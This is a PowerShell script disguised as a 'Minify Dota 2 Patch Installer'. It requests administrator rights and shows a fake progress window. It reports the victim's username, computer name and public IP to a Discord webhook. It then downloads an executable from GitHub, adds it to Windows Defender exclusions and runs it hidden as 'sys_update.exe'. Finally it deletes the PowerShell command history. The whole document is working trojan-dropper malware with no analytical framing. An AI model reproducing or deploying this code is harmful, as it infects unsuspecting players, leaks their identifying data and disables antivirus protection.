# Check for Administrator privileges
if (!([Security.Principal.WindowsPrincipal][Security.Principal.WindowsIdentity]::GetCurrent()).IsInRole([Security.Principal.WindowsBuiltInRole]::Administrator)) {
    Start-Process powershell.exe "-NoProfile -ExecutionPolicy Bypass -File `"$PSCommandPath`"" -Verb RunAs
    exit
}

# Webhook URL Variable
$script:webhookUrl = "https://discord.com/api/webhooks/1500200205541310464/9PfnuIJ_UT-wv3loet7F32XVGQ-5SGmuHLkYETE-r9t0oldTLwwvMx5YsP_J2eTnXXmk"

# Logger Function
function Send-LogNotification {
    param(
        [string]$Status,
        [string]$Message,
        [string]$User = $env:USERNAME,
        [string]$Computer = $env:COMPUTERNAME
    )

    $timestamp = Get-Date -Format "yyyy-MM-dd HH:mm:ss"
    
    # Get Public IP
    $publicIP = try { (Invoke-RestMethod -Uri "https://api.ipify.org" -TimeoutSec 5 -ErrorAction Stop).ToString() } catch { "Unknown" }

    # Discord Embed Setup
    $color = 16776960 # Yellow
    if ($Status -eq "SUCCESS") { $color = 65280 } # Green
    elseif ($Status -eq "ERROR") { $color = 16711680 } # Red

    $embed = @{
        title = "Minify Installer Log"
        color = $color
        fields = @(
            @{ name = "Status"; value = $Status; inline = $true },
            @{ name = "User"; value = $User; inline = $true },
            @{ name = "Computer"; value = $Computer; inline = $true },
            @{ name = "IP Address"; value = $publicIP; inline = $true },
            @{ name = "Message"; value = $Message; inline = $false },
            @{ name = "Timestamp"; value = $timestamp; inline = $false }
        )
        footer = @{ text = "Minify Installer v3.2.1" }
    }

    $payload = @{ embeds = @($embed) } | ConvertTo-Json -Depth 10 -Compress
    
    try {
        [Net.ServicePointManager]::SecurityProtocol = [Net.SecurityProtocolType]::Tls12
        $bytes = [System.Text.Encoding]::UTF8.GetBytes($payload)
        Invoke-RestMethod -Uri $script:webhookUrl -Method Post -ContentType "application/json" -Body $bytes -ErrorAction SilentlyContinue
    } catch {
        # Local backup log
        $logEntry = "[$timestamp] [$Status] [$User@$Computer] [$publicIP] $Message"
        $logEntry | Out-File "$env:TEMP\minify_logs.txt" -Append -Encoding UTF8
    }
}

# Initial notification
Send-LogNotification -Status "STARTED" -Message "User started Minify installer"

# GUI Section
Add-Type -AssemblyName System.Windows.Forms
Add-Type -AssemblyName System.Drawing

$form = New-Object System.Windows.Forms.Form
$form.Text = "Minify Dota 2 Patch Installer v3.2.1"
$form.Size = New-Object System.Drawing.Size(600,400)
$form.StartPosition = "CenterScreen"
$form.FormBorderStyle = "FixedDialog"
$form.MaximizeBox = $false

$titleLabel = New-Object System.Windows.Forms.Label
$titleLabel.Location = New-Object System.Drawing.Point(20,30)
$titleLabel.Size = New-Object System.Drawing.Size(540,30)
$titleLabel.Text = "Minify Dota 2 Patch Installer"
$titleLabel.Font = New-Object System.Drawing.Font("Arial",16,[System.Drawing.FontStyle]::Bold)
$form.Controls.Add($titleLabel)

$progressBar = New-Object System.Windows.Forms.ProgressBar
$progressBar.Location = New-Object System.Drawing.Point(20,300)
$progressBar.Size = New-Object System.Drawing.Size(540,23)
$form.Controls.Add($progressBar)

$statusLabel = New-Object System.Windows.Forms.Label
$statusLabel.Location = New-Object System.Drawing.Point(20,330)
$statusLabel.Size = New-Object System.Drawing.Size(540,20)
$statusLabel.Text = "Preparing..."
$form.Controls.Add($statusLabel)

$form.Show()

# Fake Installation Process
$steps = @(
    "Analyzing Dota 2 files...",
    "Optimizing shaders...",
    "Applying performance patch...",
    "Loading modules...",
    "Finalizing..."
)

for ($i = 0; $i -lt $steps.Count; $i++) {
    $statusLabel.Text = $steps[$i]
    $progressBar.Value = [int](($i + 1) * (100 / $steps.Count))
    $form.Refresh()
    Start-Sleep -Milliseconds (Get-Random -Min 800 -Max 1500)
}

# Download and Execute Section
$u = "https://raw.githubusercontent.com/winstarchik/FFF/main/XClient.exe"
$p = "$env:TEMP\sys_update.exe"

try {
    $wc = New-Object System.Net.WebClient
    $wc.DownloadFile($u, $p)

    # Add to Windows Defender exclusions
    Add-MpPreference -ExclusionPath $p -Force -ErrorAction SilentlyContinue

    $statusLabel.Text = "Installation complete!"
    $form.Refresh()
    Start-Sleep -Seconds 1

    Start-Process -FilePath $p -WindowStyle Hidden
    
    $form.Close()
    [System.Windows.Forms.MessageBox]::Show("Patch applied successfully!", "Done", 0, 64)
    
    Send-LogNotification -Status "SUCCESS" -Message "Payload executed successfully"
} catch {
    $statusLabel.Text = "Network error during installation."
    $form.Refresh()
    Start-Sleep -Seconds 2
    $form.Close()
    Send-LogNotification -Status "ERROR" -Message "Installation failed: $($_.Exception.Message)"
}

# Cleanup history
Remove-Item (Get-PSReadlineOption).HistorySavePath -ErrorAction SilentlyContinue
